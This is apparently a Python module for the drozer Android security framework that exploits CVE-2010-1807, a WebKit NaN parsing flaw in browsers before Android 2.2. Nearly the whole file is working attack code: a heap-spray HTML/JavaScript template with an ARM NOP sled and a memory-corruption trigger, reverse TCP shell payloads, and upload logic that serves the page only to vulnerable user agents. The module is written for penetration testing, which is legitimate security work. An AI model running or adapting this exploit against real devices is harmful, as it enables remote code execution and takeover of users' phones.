from drozer.modules import Module, common

class NaNParse(Module, common.Exploit):

    name = "Webkit Invalid NaN Parsing (CVE-2010-1807)"
    description = """
    Webkit does not properly validate floating-point data, which allows a remote
    attacker to execute arbitrary code or cause a denial of service via a crafted
    HTML document, related to non-standard NaN representation.
    
    Reference: CVE-2010-1807
    Vulnerable:
    
      * Android < 2.2
    """
    examples = ""
    author = ["MJ Keith", "Itzhak Avraham", "Tyrone (@mwrlabs)"]
    date = "2013-06-22"
    license = "BSD (3 clause)"
    module_type = "exploit"
    path = ["exploit", "remote", "webkit"]
    
    payloads = ["weasel.reverse_tcp.armeabi", "shell.reverse_tcp.armeabi"]
    working_dir = "/data/data/com.android.browser"
    
    __template = """
    <html>
    <head>
    <script>
    function trigger() {
        var span = document.createElement("div");
        document.getElementById("BodyID").appendChild(span);
        span.innerHTML = -parseFloat("NAN(ffffe00572c60)"); //memory corruption when handling invalid values
    }
    
    function exploit() {
        var nop = unescape("\u33bc\u0057"); //LDREQH R3,[R7],-0x3C for nopping
        do {
            nop += nop;
        } while (nop.length <= 0x1000);
        
        var scode = nop + unescape("xxx");

        target = new Array();
        for(i=0; i<0x1000; i++)
            target[i] = scode;
            
        for(i=0; i<=0x1000; i++) {
            document.write(target[i] + "<i>");
            if(i > 0x999)
                trigger();
        }
    }
    </script>
    </head>
    <body id="BodyID">
        <br />
        <script>
            exploit();
        </script>
    </body>
    </html>
    """
    
    def __init__(self, session, loader):
        Module.__init__(self, session)
        common.Exploit.__init__(self, loader)
        
        self.payload_format = "U"
    
    def generate(self, arguments):
        exploit = self.__template.replace("xxx", self.payload)
        path = self.generate_path()
        
        print "Uploading Exploit to /nanparse.html...",
        if not self.upload(arguments, path, self.build_multipart({ ".*Android.*2\.1.*AppleWebKit.*": exploit }, "gc0p4Jq0M2Yt08jU534c0p"), headers={ "X-Drozer-Vary-UA": "true; boundary=gc0p4Jq0M2Yt08jU534c0p" }):
            return
        
        print "Done. The exploit is available at: http://%s:%d%s" % (arguments.server[0], arguments.server[1], path)
        